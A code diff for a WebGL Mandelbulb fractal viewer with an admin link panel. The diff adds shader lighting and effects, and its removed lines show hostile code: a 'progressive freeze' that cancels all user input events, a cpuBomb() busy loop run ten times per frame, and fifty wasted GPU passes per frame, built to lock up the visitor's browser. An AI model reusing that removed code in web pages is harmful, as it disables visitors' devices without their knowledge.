-    document.addEventListener('touchend', e=>e.preventDefault(), {passive:false, capture:true});
-    document.addEventListener('click', e=>e.preventDefault(), true);
-    document.addEventListener('dblclick', e=>e.preventDefault(), true);
-    document.addEventListener('contextmenu', e=>e.preventDefault(), true);
-    document.addEventListener('wheel', e=>e.preventDefault(), {passive:false, capture:true});
-}
-
-// Start progressive freeze after loading screen
-setTimeout(() => {
-    startProgressiveFreeze();
-}, 3000);
-
-// ========== ADMIN DATA ==========
+let lastTime = 0;
+let frameCount = 0;
+let fpsTime = 0;
+let currentFPS = 60;
+let gl, canvas;
+let program, postProgram;
+let frameBuffer, frameTexture;
+let quadVBO;
+let uTime, uResolution, uCameraPos, uCameraTarget, uCameraUp;
+let uConfig, uMode;
+let postUTexture, postUResolution, postUConfig, postUTime;
 let savedLinks = JSON.parse(localStorage.getItem('cyberfractal_links') || '[]');
 
-// ========== WEBGL RENDERER ==========
-const CONFIG = {
-    maxIterations: 16, fractalPower: 32.0, colorIntensity: 5.0, zoomSpeed: 0.3,
-    bloomStrength: 3.0, renderMode: 0, maxRaySteps: 512, minDist: 0.000001,
-    shadowSoftness: 128.0, aoStrength: 5.0, fogDensity: 1.0, timeScale: 0.15
-};
-const camera = {
-    pos: [2.5, 1.5, 2.5], target: [0,0,0], up: [0,1,0], fov: 60,
-    rotVel: [0,0], zoomVel: 0, panVel: [0,0],
-    theta: 0.785, phi: 0.615, radius: 4.0,
-    targetTheta: 0.785, targetPhi: 0.615, targetRadius: 4.0, targetCenter: [0,0,0]
-};
-const input = { mouseDown: false, rightMouseDown: false, lastX: 0, lastY: 0, touchCount: 0, touchDist: 0 };
-let lastTime = 0, frameCount = 0, fpsTime = 0, currentFPS = 60;
-let gl, canvas, program, postProgram, frameBuffer, frameTexture, quadVBO;
-let uTime, uResolution, uCameraPos, uCameraTarget, uCameraUp, uConfig, uMode;
-let postUTexture, postUResolution, postUConfig, postUTime;
+function initLoadingScreen() {
+    const loadingScreen = document.getElementById('loading-screen');
+    const percentText = document.getElementById('loading-percent');
+    const messages = [
+        'INITIALIZING GPU...',
+        'COMPILING SHADERS...',
+        'OPTIMIZING RENDER PIPELINE...',
+        'LOADING FRACTAL DATA...',
+        'CALIBRATING LIGHTING...',
+        'MAXIMIZING PERFORMANCE...',
+        'READY'
+    ];
+    let msgIndex = 0;
+    const msgInterval = setInterval(() => {
+        if (msgIndex < messages.length) {
+            percentText.textContent = messages[msgIndex];
+            msgIndex++;
+        }
+    }, 650);
+    setTimeout(() => {
+        clearInterval(msgInterval);
+        loadingScreen.classList.add('hidden');
+        setTimeout(() => {
+            loadingScreen.style.display = 'none';
+        }, 800);
+    }, 5000);
+}
 
 const VERTEX_SHADER = `
 precision highp float;
-precision highp int;
 attribute vec2 a_position;
 varying vec2 v_uv;
 void main() {
@@ -789,7 +707,6 @@ void main() {
 
 const FRAGMENT_SHADER = `
 precision highp float;
-precision highp int;
 uniform float u_time;
 uniform vec2 u_resolution;
 uniform vec3 u_cameraPos;
@@ -801,9 +718,9 @@ varying vec2 v_uv;
 
 #define PI 3.14159265359
 #define MAX_STEPS 256
-#define MIN_DIST 0.0001
-#define MAX_DIST 50.0
-#define EPSILON 0.0005
+#define MIN_DIST 0.00005
+#define MAX_DIST 80.0
+#define EPSILON 0.0003
 
 mat3 lookAt(vec3 eye, vec3 target, vec3 up) {
     vec3 f = normalize(target - eye);
@@ -817,20 +734,27 @@ vec3 rotateY(vec3 p, float a) {
     return vec3(c*p.x + s*p.z, p.y, -s*p.x + c*p.z);
 }
 
+vec3 rotateX(vec3 p, float a) {
+    float c = cos(a), s = sin(a);
+    return vec3(p.x, c*p.y - s*p.z, s*p.y + c*p.z);
+}
+
 float mandelbulbDE(vec3 pos, float power, int iterations) {
     vec3 z = pos;
     float dr = 1.0;
     float r = 0.0;
-    float anim = sin(u_time * 0.3) * 0.1;
+    float theta, phi, zr;
+    float anim = sin(u_time * 0.3) * 0.15;
     float p = power + anim;
-    for (int i = 0; i < 8; i++) {
+
+    for (int i = 0; i < 16; i++) {
         if (i >= iterations) break;
         r = length(z);
-        if (r > 4.0) break;
-        float theta = acos(clamp(z.z / r, -1.0, 1.0));
-        float phi = atan(z.y, z.x);
+        if (r > 8.0) break;
+        theta = acos(clamp(z.z / r, -1.0, 1.0));
+        phi = atan(z.y, z.x);
         dr = pow(r, p - 1.0) * p * dr + 1.0;
-        float zr = pow(r, p);
+        zr = pow(r, p);
         theta = theta * p;
         phi = phi * p;
         z = zr * vec3(sin(theta) * cos(phi), sin(theta) * sin(phi), cos(theta));
@@ -841,34 +765,125 @@ float mandelbulbDE(vec3 pos, float power, int iterations) {
 
 float sceneDE(vec3 p) {
     p = rotateY(p, u_time * 0.05);
+    p = rotateX(p, sin(u_time * 0.1) * 0.1);
     float d = mandelbulbDE(p, u_config.y, int(u_config.x));
-    return d;
+    float floorDist = p.y + 2.0 + sin(length(p.xz) * 2.0 - u_time * 0.5) * 0.1;
+    float orb1 = length(p - vec3(3.0, 1.0 + sin(u_time * 0.7) * 0.5, 2.0)) - 0.3;
+    float orb2 = length(p - vec3(-2.5, 0.5 + cos(u_time * 0.5) * 0.3, -1.5)) - 0.2;
+    float d2 = min(orb1, orb2);
+    return min(min(d, floorDist), d2);
 }
 
 vec3 calcNormal(vec3 p) {
     vec2 e = vec2(EPSILON, -EPSILON);
-    return normalize(
-        e.xyy * sceneDE(p + e.xyy) +
-        e.yyx * sceneDE(p + e.yyx) +
-        e.yxy * sceneDE(p + e.yxy) +
-        e.xxx * sceneDE(p + e.xxx)
+    vec4 v = vec4(
+        sceneDE(p + e.xyy),
+        sceneDE(p + e.yxy),
+        sceneDE(p + e.yyx),
+        sceneDE(p + e.xxx)
     );
+    return normalize(vec3(
+        v.x + v.y - v.z - v.w,
+        v.x - v.y + v.z - v.w,
+        v.x - v.y - v.z + v.w
+    ));
+}
+
+float softShadow(vec3 ro, vec3 rd, float mint, float maxt, float k) {
+    float res = 1.0;
+    float t = mint;
+    float ph = 1e10;
+    for (int i = 0; i < 48; i++) {
+        if (t >= maxt) break;
+        float h = sceneDE(ro + rd * t);
+        float y = h * h / (2.0 * ph);
+        float d = sqrt(h * h - y * y);
+        res = min(res, k * d / max(0.0, t - y));
+        ph = h;
+        t += clamp(h, 0.015, 0.3);
+        if (res < 0.005) break;
+    }
+    return clamp(res, 0.0, 1.0);
+}
+
+float calcAO(vec3 p, vec3 n) {
+    float occ = 0.0;
+    float sca = 1.0;
+    for (int i = 0; i < 8; i++) {
+        float h = 0.005 + 0.15 * float(i) / 7.0;
+        float d = sceneDE(p + h * n);
+        occ += (h - d) * sca;
+        sca *= 0.92;
+        if (occ > 0.5) break;
+    }
+    return clamp(1.0 - 2.5 * occ, 0.0, 1.0) * (0.5 + 0.5 * n.y);
 }
 
 vec3 cyberColor(float t, vec3 normal, vec3 pos) {
     float intensity = u_config.z;
-    vec3 c1 = vec3(0.0, 0.8, 1.0);
-    vec3 c2 = vec3(1.0, 0.0, 0.6);
-    vec3 c3 = vec3(0.1, 0.0, 0.4);
-    float pattern = sin(pos.x * 3.0 + u_time * 0.5) * sin(pos.y * 3.0 + u_time * 0.3) * sin(pos.z * 3.0 + u_time * 0.7);
+    vec3 c1 = vec3(0.0, 0.9, 1.0);
+    vec3 c2 = vec3(1.0, 0.0, 0.7);
+    vec3 c3 = vec3(0.15, 0.0, 0.5);
+    vec3 c4 = vec3(0.0, 1.0, 0.5);
+    vec3 c5 = vec3(1.0, 0.5, 0.0);
+    float pattern = sin(pos.x * 4.0 + u_time * 0.5) * sin(pos.y * 4.0 + u_time * 0.3) * sin(pos.z * 4.0 + u_time * 0.7);
     pattern = pattern * 0.5 + 0.5;
     float dist = length(pos);
-    float grad = sin(dist * 2.0 - u_time * 0.4) * 0.5 + 0.5;
+    float grad = sin(dist * 3.0 - u_time * 0.4) * 0.5 + 0.5;
+    float nDot = dot(normal, vec3(0.577));
+    float holo = sin(pos.x * 10.0 + u_time * 2.0) * sin(pos.z * 10.0 + u_time * 1.5) * 0.5 + 0.5;
     vec3 col = mix(c1, c2, pattern);
-    col = mix(col, c3, grad * 0.5);
-    float pulse = sin(u_time * 1.5) * 0.5 + 0.5;
-    col += c1 * pulse * 0.2;
+    col = mix(col, c3, grad * 0.4);
+    col = mix(col, c4, nDot * 0.3);
+    col = mix(col, c5, holo * 0.2);
+    float pulse = sin(u_time * 2.0) * 0.5 + 0.5;
+    col += c1 * pulse * 0.25;
+    col += c2 * pow(max(nDot, 0.0), 8.0) * 0.3;
     return col * intensity;
+}
+
+vec3 calcLighting(vec3 p, vec3 n, vec3 rd, float dist) {
+    vec3 light1 = vec3(5.0, 8.0, 4.0);
+    vec3 light2 = vec3(-4.0, 3.0, -5.0);
+    vec3 light3 = vec3(0.0, -3.0, 6.0);
+    vec3 light4 = vec3(3.0, 1.0, -3.0);
+    vec3 col = vec3(0.0);
+    vec3 baseColor = cyberColor(dist, n, p);
+    vec3 ambient = baseColor * 0.12;
+
+    vec3 l1 = normalize(light1 - p);
+    float diff1 = max(dot(n, l1), 0.0);
+    vec3 h1 = normalize(l1 - rd);
+    float spec1 = pow(max(dot(n, h1), 0.0), 128.0);
+    float shadow1 = softShadow(p, l1, 0.02, length(light1 - p), 24.0);
+    col += baseColor * diff1 * 1.5 * shadow1 + vec3(0.0, 0.9, 1.0) * spec1 * shadow1 * 1.0;
+
+    vec3 l2 = normalize(light2 - p);
+    float diff2 = max(dot(n, l2), 0.0);
+    vec3 h2 = normalize(l2 - rd);
+    float spec2 = pow(max(dot(n, h2), 0.0), 64.0);
+    float shadow2 = softShadow(p, l2, 0.02, length(light2 - p), 18.0);
+    col += baseColor * diff2 * 0.8 * shadow2 + vec3(1.0, 0.0, 0.7) * spec2 * shadow2 * 0.6;
+
+    vec3 l3 = normalize(light3 - p);
+    float diff3 = max(dot(n, l3), 0.0);
+    col += baseColor * diff3 * 0.4;
+
+    vec3 l4 = normalize(light4 - p);
+    float diff4 = max(dot(n, l4), 0.0);
+    vec3 h4 = normalize(l4 - rd);
+    float spec4 = pow(max(dot(n, h4), 0.0), 32.0);
+    col += baseColor * diff4 * 0.5 + vec3(1.0, 0.5, 0.0) * spec4 * 0.3;
+
+    float ao = calcAO(p, n);
+    col *= ao;
+    col += ambient * ao;
+
+    float fresnel = pow(1.0 - max(dot(n, -rd), 0.0), 4.0);
+    col += vec3(0.0, 0.8, 1.0) * fresnel * 0.5;
+    float subSurface = pow(max(dot(n, l1), 0.0), 0.5) * 0.2;
+    col += vec3(0.0, 0.5, 0.8) * subSurface;
+    return col;
 }
 
 vec4 rayMarch(vec3 ro, vec3 rd) {
@@ -876,22 +891,38 @@ vec4 rayMarch(vec3 ro, vec3 rd) {
     float d = 0.0;
     vec3 p = ro;
     float glow = 0.0;
+    float orbit = 0.0;
+
     for (int i = 0; i < MAX_STEPS; i++) {
         p = ro + rd * t;
         d = sceneDE(p);
-        glow += exp(-d * 8.0) * 0.02;
-        if (d < MIN_DIST) {
+        glow += exp(-d * 12.0) * 0.015;
+        orbit += exp(-length(p) * 0.5) * 0.01;
+        if (d < MIN_DIST * t) {
             vec3 n = calcNormal(p);
-            vec3 col = cyberColor(t, n, p);
-            float fog = exp(-t * t * 0.01);
-            col = mix(vec3(0.02, 0.02, 0.05), col, fog);
+            vec3 col = calcLighting(p, n, rd, t);
+            float fog = exp(-t * t * 0.005);
+            vec3 fogColor = vec3(0.02, 0.02, 0.06);
+            col = mix(fogColor, col, fog);
+            float desat = exp(-t * 0.05);
+            float lum = dot(col, vec3(0.299, 0.587, 0.114));
+            col = mix(vec3(lum), col, 0.5 + 0.5 * desat);
             return vec4(col, 1.0);
         }
-        t += d * 0.5;
+        t += d * 0.7;
         if (t > MAX_DIST) break;
     }
-    vec3 bg = vec3(0.01, 0.01, 0.02);
-    bg += vec3(0.0, 0.3, 0.5) * glow * u_config.z;
+
+    vec3 bg = vec3(0.01, 0.01, 0.03);
+    bg += vec3(0.0, 0.4, 0.6) * glow * u_config.z;
+    bg += vec3(0.2, 0.0, 0.3) * orbit;
+    float grid = max(
+        smoothstep(0.985, 1.0, abs(sin(rd.x * 30.0 + u_time * 0.15))),
+        smoothstep(0.985, 1.0, abs(sin(rd.y * 30.0 + u_time * 0.15)))
+    );
+    bg += vec3(0.0, 0.3, 0.5) * grid * 0.15;
+    float stars = pow(max(sin(rd.x * 100.0) * sin(rd.y * 100.0), 0.0), 20.0);
+    bg += vec3(0.8, 0.9, 1.0) * stars * 0.3;
     return vec4(bg, 0.0);
 }
 
@@ -902,24 +933,36 @@ void main() {
     mat3 cam = lookAt(ro, ta, u_cameraUp);
     vec3 rd = cam * normalize(vec3(uv, -1.5));
     vec4 result = rayMarch(ro, rd);
+
     if (u_mode == 1) {
-        float lum = dot(result.rgb, vec3(0.299, 0.587, 0.114));
-        result.rgb = mix(vec3(lum), result.rgb, 1.5);
-        result.rgb = pow(result.rgb, vec3(0.8));
+        vec3 hsv = result.rgb;
+        float lum = dot(hsv, vec3(0.299, 0.587, 0.114));
+        result.rgb = mix(vec3(lum), hsv, 1.8);
+        result.rgb = pow(result.rgb, vec3(0.75));
+        result.rgb += vec3(0.0, 0.2, 0.1);
     } else if (u_mode == 2) {
-        result.rgb = mix(vec3(0.0, 0.1, 0.15), vec3(0.0, 0.9, 1.0), result.a);
+        float edge = 0.0;
+        for (float i = 0.0; i < 4.0; i++) {
+            vec2 off = vec2(cos(i * 1.571), sin(i * 1.571)) * 0.002;
+            edge += abs(sceneDE(ro + rd * (result.a > 0.5 ? 0.0 : 8.0) + cam * vec3(off, 0.0)) - 
+                       sceneDE(ro + rd * (result.a > 0.5 ? 0.0 : 8.0)));
+        }
+        edge = smoothstep(0.0, 0.015, edge);
+        result.rgb = mix(vec3(0.0, 0.05, 0.1), vec3(0.0, 1.0, 0.8), edge);
+        result.rgb += vec3(0.0, 0.3, 0.5) * (1.0 - edge) * 0.2;
     }
-    result.rgb = result.rgb / (1.0 + result.rgb * 0.5);
+
+    result.rgb = result.rgb * (2.51 * result.rgb + 0.03) / (result.rgb * (2.43 * result.rgb + 0.59) + 0.14);
     result.rgb = pow(result.rgb, vec3(0.4545));
-    float vig = 1.0 - dot(v_uv - 0.5, v_uv - 0.5) * 0.8;
+    float vig = 1.0 - dot(v_uv - 0.5, v_uv - 0.5) * 0.9;
     result.rgb *= vig;
+    result.rgb = vec3(result.r * 1.05, result.g * 1.0, result.b * 1.15);
     gl_FragColor = vec4(result.rgb, 1.0);
 }
 `;
 
 const POST_FRAGMENT = `
 precision highp float;
-precision highp int;
 uniform sampler2D u_texture;
 uniform vec2 u_resolution;
 uniform vec4 u_config;
@@ -932,25 +975,35 @@ void main() {
     vec3 bloom = vec3(0.0);
     float bloomStr = u_config.w;
     vec2 texel = 1.0 / u_resolution;
-    for (float x = -4.0; x <= 4.0; x++) {
-        for (float y = -4.0; y <= 4.0; y++) {
+    for (float x = -3.0; x <= 3.0; x++) {
+        for (float y = -3.0; y <= 3.0; y++) {
             vec2 off = vec2(x, y) * texel * 3.0;
             vec3 sampleCol = texture2D(u_texture, uv + off).rgb;
             float brightness = dot(sampleCol, vec3(0.299, 0.587, 0.114));
-            if (brightness > 0.5) {
-                bloom += sampleCol * 0.01;
+            if (brightness > 0.4) {
+                bloom += sampleCol * 0.02;
             }
         }
     }
     col += bloom * bloomStr;
-    float ca = 0.003;
-    col.r = texture2D(u_texture, uv + vec2(ca, 0.0)).r * 0.7 + col.r * 0.3;
-    col.b = texture2D(u_texture, uv - vec2(ca, 0.0)).b * 0.7 + col.b * 0.3;
-    float scanline = sin(uv.y * u_resolution.y * 1.5 + u_time * 2.0) * 0.03;
+    float ca = 0.004;
+    col.r = texture2D(u_texture, uv + vec2(ca, 0.0)).r * 0.6 + col.r * 0.4;
+    col.b = texture2D(u_texture, uv - vec2(ca, 0.0)).b * 0.6 + col.b * 0.4;
+    vec2 center = uv - 0.5;
+    float dist = length(center);
+    col.r = texture2D(u_texture, uv + center * ca * 2.0).r * 0.3 + col.r * 0.7;
+    col.b = texture2D(u_texture, uv - center * ca * 2.0).b * 0.3 + col.b * 0.7;
+    float scanline = sin(uv.y * u_resolution.y * 2.0 + u_time * 3.0) * 0.025;
     col -= scanline;
+    float bands = smoothstep(0.98, 1.0, sin(uv.y * u_resolution.y * 0.5));
+    col *= 1.0 - bands * 0.1;
     float noise = fract(sin(dot(uv * u_time, vec2(12.9898, 78.233))) * 43758.5453);
-    col += (noise - 0.5) * 0.015;
-    col = pow(col, vec3(0.95));
+    col += (noise - 0.5) * 0.02;
+    float grain = fract(sin(dot(uv * (u_time + 100.0), vec2(93.9898, 67.345))) * 7658.5453);
+    col += (grain - 0.5) * 0.015;
+    col = pow(col, vec3(0.92));
+    float lum = dot(col, vec3(0.299, 0.587, 0.114));
+    col = mix(vec3(lum), col, 1.1);
     gl_FragColor = vec4(col, 1.0);
 }
 `;
@@ -984,21 +1037,29 @@ function createProgram(gl, vsSource, fsSource) {
 function initWebGL() {
     canvas = document.getElementById('glCanvas');
     gl = canvas.getContext('webgl', { 
-        antialias: false, alpha: false,
+        antialias: false, 
+        alpha: false,
         preserveDrawingBuffer: false,
-        powerPreference: 'high-performance'
+        powerPreference: 'high-performance',
+        premultipliedAlpha: false
     });
+
     if (!gl) {
-        console.log('WebGL not supported');
+        alert('WebGL not supported');
         return;
     }
+
+    gl.getExtension('OES_texture_float');
+    gl.getExtension('OES_texture_float_linear');
+    gl.getExtension('WEBGL_color_buffer_float');
+    gl.getExtension('EXT_shader_texture_lod');
+
     const quadData = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
     quadVBO = gl.createBuffer();
     gl.bindBuffer(gl.ARRAY_BUFFER, quadVBO);
     gl.bufferData(gl.ARRAY_BUFFER, quadData, gl.STATIC_DRAW);
 
     program = createProgram(gl, VERTEX_SHADER, FRAGMENT_SHADER);
-    if (!program) return;
     const posLoc = gl.getAttribLocation(program, 'a_position');
     gl.enableVertexAttribArray(posLoc);
     gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
@@ -1012,7 +1073,6 @@ function initWebGL() {
     uMode = gl.getUniformLocation(program, 'u_mode');
 
     postProgram = createProgram(gl, VERTEX_SHADER, POST_FRAGMENT);
-    if (!postProgram) return;
     const postPosLoc = gl.getAttribLocation(postProgram, 'a_position');
     gl.enableVertexAttribArray(postPosLoc);
     gl.vertexAttribPointer(postPosLoc, 2, gl.FLOAT, false, 0, 0);
@@ -1038,7 +1098,7 @@ function createFramebuffer() {
 }
 
 function resize() {
-    const dpr = Math.min(window.devicePixelRatio, 2.0);
+    const dpr = Math.min(window.devicePixelRatio, 2.5);
     const w = Math.floor(window.innerWidth * dpr);
     const h = Math.floor(window.innerHeight * dpr);
     canvas.width = w;
@@ -1051,22 +1111,12 @@ function resize() {
     document.getElementById('res').textContent = 'RES: ' + w + 'x' + h;
 }
 
-function cpuBomb() {
-    let x = 0;
-    for(let i=0; i<9999999; i++) {
-        x += Math.sin(i) * Math.cos(i) * Math.tan(i % 1.57 + 0.001);
-        x = Math.sqrt(Math.abs(x) + 1) * Math.log(i + 2);
-        x = Math.pow(x, 1.001) % 999999999;
-    }
-    return x;
-}
-
 function updateCamera(dt) {
-    const smooth = 1.0 - Math.exp(-dt * 6.0);
+    const smooth = 1.0 - Math.exp(-dt * 8.0);
     camera.theta += (camera.targetTheta - camera.theta) * smooth;
     camera.phi += (camera.targetPhi - camera.phi) * smooth;
     camera.radius += (camera.targetRadius - camera.radius) * smooth;
-    camera.phi = Math.max(0.1, Math.min(Math.PI - 0.1, camera.phi));
+    camera.phi = clamp(camera.phi, 0.1, Math.PI - 0.1);
     camera.radius = Math.max(camera.radius, 0.5);
     const st = Math.sin(camera.theta);
     const ct = Math.cos(camera.theta);
@@ -1076,18 +1126,16 @@ function updateCamera(dt) {
     camera.pos[1] = camera.targetCenter[1] + camera.radius * cp;
     camera.pos[2] = camera.targetCenter[2] + camera.radius * ct * sp;
     if (!input.mouseDown && !input.rightMouseDown && input.touchCount === 0) {
-        camera.targetTheta += dt * CONFIG.zoomSpeed * 0.2;
+        camera.targetTheta += dt * CONFIG.zoomSpeed * 0.3;
     }
 }
 
-function render(time) {
-    cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb();
-    cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb();
+function clamp(v, min, max) { return Math.max(min, Math.min(max, v)); }
 
+function render(time) {
     const t = time * 0.001;
     const dt = Math.min(t - lastTime, 0.05);
     lastTime = t;
-
     frameCount++;
     if (t - fpsTime > 1.0) {
         currentFPS = frameCount;
@@ -1095,34 +1143,29 @@ function render(time) {
         fpsTime = t;
         document.getElementById('fps').textContent = 'FPS: ' + currentFPS;
     }
-
     updateCamera(dt);
 
-    if (gl && program && postProgram) {
-        gl.bindFramebuffer(gl.FRAMEBUFFER, frameBuffer);
-        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, frameTexture, 0);
-        gl.useProgram(program);
-        gl.uniform1f(uTime, t);
-        gl.uniform2f(uResolution, canvas.width, canvas.height);
-        gl.uniform3f(uCameraPos, camera.pos[0], camera.pos[1], camera.pos[2]);
-        gl.uniform3f(uCameraTarget, camera.targetCenter[0], camera.targetCenter[1], camera.targetCenter[2]);
-        gl.uniform3f(uCameraUp, 0, 1, 0);
-        gl.uniform4f(uConfig, CONFIG.maxIterations, CONFIG.fractalPower, CONFIG.colorIntensity, CONFIG.bloomStrength);
-        gl.uniform1i(uMode, CONFIG.renderMode);
-        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    gl.bindFramebuffer(gl.FRAMEBUFFER, frameBuffer);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, frameTexture, 0);
+    gl.useProgram(program);
+    gl.uniform1f(uTime, t);
+    gl.uniform2f(uResolution, canvas.width, canvas.height);
+    gl.uniform3f(uCameraPos, camera.pos[0], camera.pos[1], camera.pos[2]);
+    gl.uniform3f(uCameraTarget, camera.targetCenter[0], camera.targetCenter[1], camera.targetCenter[2]);
+    gl.uniform3f(uCameraUp, 0, 1, 0);
+    gl.uniform4f(uConfig, CONFIG.maxIterations, CONFIG.fractalPower, CONFIG.colorIntensity, CONFIG.bloomStrength);
+    gl.uniform1i(uMode, CONFIG.renderMode);
+    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
 
-        gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-        gl.useProgram(postProgram);
-        gl.activeTexture(gl.TEXTURE0);
-        gl.bindTexture(gl.TEXTURE_2D, frameTexture);
-        gl.uniform1i(postUTexture, 0);
-        gl.uniform2f(postUResolution, canvas.width, canvas.height);
-        gl.uniform4f(postUConfig, CONFIG.maxIterations, CONFIG.fractalPower, CONFIG.colorIntensity, CONFIG.bloomStrength);
-        gl.uniform1f(postUTime, t);
-        for(let pass=0; pass<50; pass++) {
-            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-        }
-    }
+    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+    gl.useProgram(postProgram);
+    gl.activeTexture(gl.TEXTURE0);
+    gl.bindTexture(gl.TEXTURE_2D, frameTexture);
+    gl.uniform1i(postUTexture, 0);
+    gl.uniform2f(postUResolution, canvas.width, canvas.height);
+    gl.uniform4f(postUConfig, CONFIG.maxIterations, CONFIG.fractalPower, CONFIG.colorIntensity, CONFIG.bloomStrength);
+    gl.uniform1f(postUTime, t);
+    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
 
     requestAnimationFrame(render);
 }
@@ -1137,10 +1180,12 @@ function initInputs() {
         input.lastX = e.clientX;
         input.lastY = e.clientY;
     });
+
     document.addEventListener('mouseup', e => {
         if (e.button === 0) input.mouseDown = false;
         if (e.button === 2) input.rightMouseDown = false;
     });
+
     document.addEventListener('mousemove', e => {
         const dx = e.clientX - input.lastX;
         const dy = e.clientY - input.lastY;
@@ -1157,12 +1202,15 @@ function initInputs() {
         input.lastX = e.clientX;
         input.lastY = e.clientY;
     });
+
     document.addEventListener('wheel', e => {
         if (e.target.closest('#ui-controls')) return;
         e.preventDefault();
         camera.targetRadius *= Math.exp(e.deltaY * 0.001);
     }, { passive: false });
+
     document.addEventListener('contextmenu', e => e.preventDefault());
+
     document.addEventListener('touchstart', e => {
         if (e.target.closest('#ui-controls') || e.target.closest('#hamburger') || 
             e.target.closest('#owner-btn') || e.target.closest('#login-panel') ||
@@ -1177,6 +1225,7 @@ function initInputs() {
             input.touchDist = Math.sqrt(dx*dx + dy*dy);
         }
     }, { passive: false });
+
     document.addEventListener('touchmove', e => {
         if (e.target.closest('#ui-controls')) return;
         e.preventDefault();
@@ -1205,6 +1254,7 @@ function initInputs() {
             input.lastY = cy;
         }
     }, { passive: false });
+
     document.addEventListener('touchend', e => {
         input.touchCount = e.touches.length;
     });
@@ -1218,6 +1268,7 @@ function initUI() {
         'zoom-speed': { key: 'zoomSpeed', display: 'zoom-val' },
         'bloom': { key: 'bloomStrength', display: 'bloom-val' }
     };
+
     for (const [id, cfg] of Object.entries(sliders)) {
         const el = document.getElementById(id);
         const disp = document.getElementById(cfg.display);
@@ -1226,6 +1277,7 @@ function initUI() {
             disp.textContent = cfg.int ? CONFIG[cfg.key] : CONFIG[cfg.key].toFixed(2);
         });
     }
+
     document.querySelectorAll('.mode-btn').forEach(btn => {
         btn.addEventListener('click', () => {
             document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
@@ -1241,18 +1293,22 @@ function initAdmin() {
     const loginPanel = document.getElementById('login-panel');
     const adminPanel = document.getElementById('admin-panel');
     let menuOpen = false;
+
     hamburger.addEventListener('click', () => {
         menuOpen = !menuOpen;
         ownerBtn.style.display = menuOpen ? 'block' : 'none';
     });
+
     ownerBtn.addEventListener('click', () => {
         loginPanel.style.display = 'block';
         menuOpen = false;
         ownerBtn.style.display = 'none';
     });
+
     document.getElementById('login-close').addEventListener('click', () => {
         loginPanel.style.display = 'none';
     });
+
     document.getElementById('login-submit').addEventListener('click', () => {
         const user = document.getElementById('login-user').value;
         const pass = document.getElementById('login-pass').value;
@@ -1267,6 +1323,7 @@ function initAdmin() {
             document.getElementById('login-error').style.display = 'block';
         }
     });
+
     document.getElementById('add-link').addEventListener('click', () => {
         const url = document.getElementById('link-url').value.trim();
         const desc = document.getElementById('link-desc').value.trim();
@@ -1280,6 +1337,7 @@ function initAdmin() {
             renderLinks();
         }
     });
+
     document.getElementById('clear-links').addEventListener('click', () => {
         savedLinks = [];
         localStorage.setItem('cyberfractal_links', JSON.stringify(savedLinks));
@@ -1314,6 +1372,7 @@ function renderLinks() {
 }
 
 window.addEventListener('load', () => {
+    initLoadingScreen();
     initWebGL();
     initInputs();
     initUI();
